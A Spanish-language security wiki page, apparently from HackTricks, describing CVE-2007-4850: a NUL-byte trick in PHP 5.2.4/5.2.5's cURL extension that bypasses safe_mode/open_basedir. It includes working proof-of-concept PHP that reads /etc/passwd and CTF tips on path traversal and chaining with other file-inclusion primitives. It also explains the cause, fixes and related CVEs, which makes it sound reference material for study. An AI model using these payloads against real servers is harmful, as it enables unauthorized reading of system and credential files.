# PHP 5.2.4 y 5.2.5 PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

Esta página documenta un truco legado pero todavía útil en CTFs/instalaciones locales antiguas para eludir las comprobaciones safe_mode/open_basedir de PHP usando la extensión cURL en builds específicos de PHP 5.2.x.

- Afectado: PHP 5.2.4 y 5.2.5 con ext/curl habilitado.
- Impacto: Lectura de archivos locales arbitrarios a pesar de las restricciones safe_mode o open_basedir (sin ejecución directa de código).
- ID: CVE-2007-4850.

Fuente: http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## PoC de una línea

Si safe_mode o open_basedir están activos y cURL está habilitado, lo siguiente devolverá el contenido del script actual:
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## PoC más explícito (arbitrary file read)
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
Notas:
- Usa comillas dobles o chr(0) para inyectar un byte NUL real. El percent-encoding (%00) no funcionará de forma fiable.
- Esto es una primitiva de lectura de archivos. Combínala con otras primitivas (log poisoning, session file inclusion, etc.) para escalada adicional cuando sea posible.

## Por qué funciona (breve)

La vulnerabilidad radica en cómo PHP 5.2.4/5.2.5 realizaba las comprobaciones de safe_mode/open_basedir para URLs file:// en ext/curl. La comprobación analizaba el URL y validaba un componente de ruta, pero debido al manejo de bytes NUL validaba una cadena distinta de la que realmente usaba libcurl. En la práctica, el validador podía aprobar la ruta situada después del NUL mientras libcurl usaba la parte antes del NUL como contenedor del URL, permitiendo un bypass que resulta en la lectura del archivo colocado después del byte NUL. Consulta el análisis original y el macro afectado en curl/interface.c para más detalles. [CVE-2007-4850].

## Restricciones y correcciones

- Corregido en versiones posteriores 5.2.x (p. ej., builds de distribuciones parcheadas a 5.2.6) mediante la corrección del análisis/validación en ext/curl.
- Solo afecta despliegues muy antiguos de PHP; safe_mode fue eliminado en PHP 5.4 y las builds modernas no presentan este comportamiento.

## Bypasses históricos relacionados basados en cURL

- CVE-2006-2563 (PHP 4.4.2/5.1.4): los wrappers de libcurl permitían acceso `file://` con NULs embebidos para evadir open_basedir; corregido antes de 5.2.x.
- PHP bugs #30609/#36223 rastrearon problemas tempranos de cURL open_basedir usando `file://` sin canonicalización. Cualquier comprobación antes del byte NUL o sin resolución estilo `realpath` es propensa a la misma truncación.

## Consejos CTF

- Cuando identifiques PHP 5.2.4/5.2.5 con ext/curl cargado (busca `cURL support => enabled` en `phpinfo()` y la `PHP Version` exacta), este truco suele funcionar incluso si `allow_url_fopen` está deshabilitado porque ext/curl maneja `file://` por sí mismo.
- Si las rutas directas están bloqueadas, prueba traversal relativo después del NUL, p. ej. `file://x\x00../../../../etc/passwd`. El traversal lo resuelve libcurl, no la guardia open_basedir.
- Puedes encapsular el payload en un único cuerpo de solicitud HTTP para desencadenar el LFI a través de código del lado del servidor vulnerable que refleja URLs controladas por el usuario en `curl_exec()` (común en endpoints tipo SSRF heredados).

## Véase también

Other disable_functions/open_basedir bypasses and modern techniques are collected here:

{{#ref}}
README.md
{{#endref}}

## Referencias

- [Ubuntu CVE entry with patch pointers and affected versions](https://ubuntu.com/security/CVE-2007-4850)
- [Technical writeup with code context (cxsecurity)](http://cxsecurity.com/issue/WLB-2008010060)
- [PHP bug #36223 (curl bypasses open_basedir)](https://bugs.php.net/bug.php?id=36223)
- [CVE-2006-2563 cURL PHP File Access Bypass (earlier NUL-byte issue)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2563)
{{#include ../../../../banners/hacktricks-training.md}}
